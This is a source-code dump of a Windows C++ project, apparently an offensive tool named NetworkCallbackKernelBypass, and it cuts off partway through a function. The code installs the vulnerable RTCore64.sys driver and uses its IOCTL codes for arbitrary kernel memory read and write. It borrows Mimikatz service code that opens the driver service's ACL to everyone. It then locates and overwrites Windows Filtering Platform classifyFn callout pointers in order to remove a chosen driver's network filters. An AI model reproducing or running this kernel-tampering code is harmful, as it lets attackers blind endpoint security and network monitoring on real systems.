		SolutionGuid = {A8101FDA-9036-4CCC-AD4C-6D2CCC772522}
	EndGlobalSection
EndGlobal

```

`NetworkKernelBypass/NetworkCallbackKernelBypass/MemHandler.cpp`:

```cpp
#include "MemHandler.h"

```

`NetworkKernelBypass/NetworkCallbackKernelBypass/MemHandler.h`:

```h
#pragma once
#include <Windows.h>
class MemHandler
{
public:
    virtual BOOL VirtualRead(DWORD64 address, void* buffer, size_t bytesToRead) = 0;
    virtual BOOL WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) = 0;
};


```

`NetworkKernelBypass/NetworkCallbackKernelBypass/NetworkCallbackKernelBypass.cpp`:

```cpp
#include <Windows.h>
#include "memory.h"
#include "netUtil.h"

//Mimikatz code to load / unload driver
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
		if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
			if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
				if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
					if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
	BOOL status = FALSE;
	SC_HANDLE hSC = NULL, hS = NULL;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
		if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
			wprintf(L"[+] \'%s\' service already registered\n", serviceName);
		}
		else {
			if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
				wprintf(L"[*] \'%s\' service not present\n", serviceName);
				if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
					wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
					if (status = kull_m_service_addWorldToSD(hS))
						wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
					else printf("kull_m_service_addWorldToSD");
				}
				else PRINT_ERROR_AUTO(L"CreateService");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if (hS) {
			if (startIt) {
				if (status = StartService(hS, 0, NULL))
					wprintf(L"[+] \'%s\' service started\n", serviceName);
				else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
					wprintf(L"[*] \'%s\' service already started\n", serviceName);
				else {
					PRINT_ERROR_AUTO(L"StartService");
				}
			}
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else {
		PRINT_ERROR_AUTO(L"OpenSCManager(create)");
		return GetLastError();
	}
	return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
	BOOL status = FALSE;
	SC_HANDLE hSC, hS;
	SERVICE_STATUS serviceStatus;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
			status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
	if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
		wprintf(L"[+] \'%s\' service stopped\n", serviceName);
	}
	else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
		wprintf(L"[*] \'%s\' service not running\n", serviceName);
	}
	else {
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
		return FALSE;
	}

	if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
			BOOL status = DeleteService(hS);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return TRUE;
}
// thanks gentilkiwi!

int main(int argc, char** argv) {
	if (argc < 2) {
		printf("Usage: %s\n"
			" /networkfilters /show <drivername> - list all network filters or network filters related to a driver\n"
			" /networkfilters /driver <drivername> - Remove all classifyFn related to that driver\n"
			" /networkfilters /address <classyFn Address To Remove> - remove the classifyFn Address mentionned (make sure to add 0x before the address)\n"
			" /installDriver - Install the MSI driver\n"
			" /uninstallDriver - Uninstall the MSI driver\n"
			, argv[0]);
		return 0;
	}

	if (strcmp(argv[1] + 1, "installDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

		if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
			wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
		}
		return 0;
	}
	else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));
		service_uninstall(svcName);
		return 0;
	}

	char* strFilterName = (char*) "test";
	char* strDriverName;
	UCHAR indexToRemove = 0;
	DWORD64 AddressToRemove = 0x00;

	if (!strcmp(argv[1] + 1, "networkfilters") && argv[2] != NULL && !strcmp(argv[2] + 1, "address") && argc > 3 && argv[3] != NULL) {
		AddressToRemove = (DWORD64) argv[3];
	}

	Memory m = Memory();
	NetworkManager oFlt = NetworkManager(&m);

	if (!strcmp(argv[1] + 1, "networkfilters") && !strcmp(argv[2] + 1, "show")) {
		if (argc > 3 && argv[3] != NULL) {
			strDriverName = argv[3];
			wchar_t* wstrDriverName = new wchar_t[strlen(strDriverName) + 2];
			size_t numConv = 0;
			mbstowcs_s(&numConv, wstrDriverName, strlen(strDriverName) + 2, strDriverName, strlen(strDriverName));
			printf("Enumerating for driver %S\n", strDriverName);

			oFlt.EnumerateNetworkFilters(false, wstrDriverName);
		}
		else {
			oFlt.EnumerateNetworkFilters(false);
		}
	}

	if (!strcmp(argv[1] + 1, "networkfilters") && (!strcmp(argv[2] + 1, "driver") || !strcmp(argv[2] + 1, "address"))) {
		if (!strcmp(argv[2] + 1, "driver") && argc > 3 && argv[3] != NULL) {
			strDriverName = argv[3];
			wchar_t* wstrDriverName = new wchar_t[strlen(strDriverName) + 2];
			size_t numConv = 0;
			mbstowcs_s(&numConv, wstrDriverName, strlen(strDriverName) + 2, strDriverName, strlen(strDriverName));
			printf("Enumerating for driver %S\n", strDriverName);

			oFlt.EnumerateNetworkFilters(true, wstrDriverName);
			printf("Press Enter To Restore");
			Sleep(2000);
			getchar();
			BOOL res = oFlt.Restore();
		}
		if (!strcmp(argv[2] + 1, "address") && argc > 3 && argv[3] != NULL) {
			DWORD64 address = 0x00;
			sscanf_s(argv[3], "0x%llx", &address);
			printf("Enumerating for address %llx\n", address);
			oFlt.EnumerateNetworkFilters(true, NULL, address);
			printf("Press Enter To Restore");
			Sleep(2000);
			getchar();
			BOOL res = oFlt.Restore();
		}
	}

	return 0;
}
```

`NetworkKernelBypass/NetworkCallbackKernelBypass/NetworkCallbackKernelBypass.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="MiniFilter Kernel Bypass.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="memory.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FltUtil.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MemHandler.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="FltUtil.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PebLdr.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FltDef.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="memory.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MemHandler.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`NetworkKernelBypass/NetworkCallbackKernelBypass/NetworkCallbackKernelBypass.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//

#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE 9, 1

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE  
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE  
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED

```

`NetworkKernelBypass/NetworkCallbackKernelBypass/NetworkCallbackKernelBypass.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`NetworkKernelBypass/NetworkCallbackKernelBypass/NetworkCallbackKernelBypass.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{973cd09d-b54a-4b52-8771-2ec18bb49241}</ProjectGuid>
    <RootNamespace>NetworkCallbackKernelBypass</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="netUtil.cpp" />
    <ClCompile Include="MemHandler.cpp" />
    <ClCompile Include="memory.cpp" />
    <ClCompile Include="NetworkCallbackKernelBypass.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="net.h" />
    <ClInclude Include="netUtil.h" />
    <ClInclude Include="MemHandler.h" />
    <ClInclude Include="memory.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`NetworkKernelBypass/NetworkCallbackKernelBypass/NetworkCallbackKernelBypass.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`NetworkKernelBypass/NetworkCallbackKernelBypass/memory.cpp`:

```cpp
#include "memory.h"

Memory::Memory()  {
	/* Constructor for Memory Manager */
	// Opens a handle to RTCORE64
    Memory::DriverHandle = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Memory::DriverHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to open handle to device\t0x%x\n", GetLastError());
        exit(1);
    }
    else {
        puts("Connected to device");

    }
}

result Memory::ReadMemoryPrimitive(DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    struct result resultdata;
    DWORD BytesReturned;

    BOOL response = DeviceIoControl(Memory::DriverHandle,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
    // Set the status and value in the result structure
    resultdata.resultstatus = response;  // Set TRUE if successful, FALSE if failed
    resultdata.resultvalue = response ? MemoryRead.Value : 0;  // Set value or 0 if failed
    return resultdata;
}

BOOL Memory::WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    BOOL response = DeviceIoControl(Memory::DriverHandle,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return response;
}

BOOL Memory::WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) {
    BOOL response = false;
    BOOL response2 = false;
    response = WriteMemoryPrimitive(4, Address, Value & 0xffffffff);
    if (response) {
        response2 = WriteMemoryPrimitive(4, Address + 4, Value >> 32);
    }
    else {
        return response;
    }
    return response2;

}

BOOL Memory::VirtualRead(DWORD64 Address, void* Buffer, size_t Size) {
        DWORD bytesRead = 0;
        DWORD offset = 0;
        struct result resultdata;
        while (Size > 0) {
            // Read 4 bytes at a time or less if Size is less than 4 bytes
            DWORD chunkSize = (Size >= 0x04) ? 0x04 : Size;
            resultdata = ReadMemoryPrimitive(chunkSize, Address + offset);
            // Check if the read operation was successful
            if (!resultdata.resultstatus) {
                return false;  // Return false if the read operation fails
            }
            else {
                DWORD chunk = resultdata.resultvalue;
                // Copy the 4-byte chunk into the Buffer
                memcpy((BYTE*)Buffer + offset, &chunk, chunkSize);

                offset += chunkSize;
                Size -= chunkSize;
            }
        }
        return true;
}
```

`NetworkKernelBypass/NetworkCallbackKernelBypass/memory.h`:

```h
#pragma once
#include <Windows.h>
#include <string>
#include "MemHandler.h"
#include <aclapi.h>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

struct result {
    DWORD resultvalue;
    BOOL resultstatus;
};

static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

class Memory : public MemHandler {
public:
	HANDLE DriverHandle;
	Memory();
    BOOL VirtualRead(DWORD64 address, void* buffer, size_t bytesToRead);
    result ReadMemoryPrimitive(DWORD Size, DWORD64 Address);
    BOOL WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value);
    BOOL WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value);
};
```

`NetworkKernelBypass/NetworkCallbackKernelBypass/net.h`:

```h
#pragma once
#define ASSERT_SZ( x, y ) static_assert(sizeof(x) == y, "incorrect size for " #x);

// begin usermode defs
#include <Windows.h>
#include <winternl.h>

// Define the structure based on the information provided
typedef struct WFP_STRUCT {
	DWORD firstDword;  // First DWORD (4 bytes)
	DWORD secondDword;     // Padding to align to 8 bytes (QWORD alignment)
	DWORD64 padding2; // Second QWORD (8 bytes)
	DWORD64 classifyFn;
	DWORD64 notifyFn;
	DWORD64 deleteFn;
	DWORD64 classifyFn2;
};
```

`NetworkKernelBypass/NetworkCallbackKernelBypass/netUtil.cpp`:

```cpp
#include "netUtil.h"
#include <tchar.h>



PVOID NetworkManager::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

TCHAR* NetworkManager::FindDriver(DWORD64 address) {

	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;
	DWORD64 diff[3][200];
	TCHAR szDriver[1024];
	static TCHAR result[2048];  // Make sure it's large enough for the output

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		int n = sizeof(drivers) / sizeof(drivers[0]);
		cDrivers = cbNeeded / sizeof(drivers[0]);
		int narrow = 0;
		int c = 0;
		for (i = 0; i < cDrivers; i++) {
			//we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
			if (address > (DWORD64)drivers[i]) {
				diff[0][c] = address;
				diff[1][c] = address - (DWORD64)drivers[i];
				diff[2][c] = (DWORD64)drivers[i];
				c++;
			}
		}
	}
	//cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
	int k = 0;
	DWORD64 temp = diff[1][0];
	for (k = 0; k < cDrivers; k++) {
		if ((temp > diff[1][k]) && (diff[0][k] == address)) {
			temp = diff[1][k];

		}
	}

	if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {

		// Combine address, szDriver, and temp into a formatted string safely
		swprintf_s(result, sizeof(result) / sizeof(TCHAR), _T("%p [%s + 0x%llx]\n"),
			(void*)address, szDriver, temp);
	}
	else {
		swprintf_s(result, sizeof(result) / sizeof(TCHAR), _T("Could not resolve driver for %p\n"),
			(void*)address);
	}

	return result;
}

BOOL NetworkManager::Restore() {
	BOOL b = false;
	if (patchCallbackMap.size() > 0) {
		for (const auto& entry : patchCallbackMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	return b;
}

NetworkManager::NetworkManager(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
	this->lpnetioBase = ResolveDriverBase(L"netio.sys");
}


BOOL NetworkManager::EnumerateNetworkFilters(BOOLEAN REMOVE, wchar_t* DriverName, DWORD64 ADDRESS) {
	
	LPVOID StartSearch = NULL;
	int numPatched = 0;
	LPVOID EndSearch = NULL;
	DWORD distance = 0;
	LPVOID pgWfpGlobal = NULL;
	LPVOID pFeDefaultClassifyCallback = NULL;
	LPVOID pInitDefaultCallout = NULL;
	DWORD FeDefaultClassifyCallback_offset = 0x00;

	HMODULE hNETIO = LoadLibraryExA(R"(C:\WINDOWS\System32\drivers\NETIO.SYS)", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hNETIO) {
		return NULL;
	}

	StartSearch = GetProcAddress(hNETIO, "FeGetWfpGlobalPtr");
	EndSearch = GetProcAddress(hNETIO, "KfdDeRefCallout");

	printf("StartSearch %llx\n", StartSearch);
	//lkd > u netio!FeInitCalloutTable L9
	//NETIO!FeInitCalloutTable:
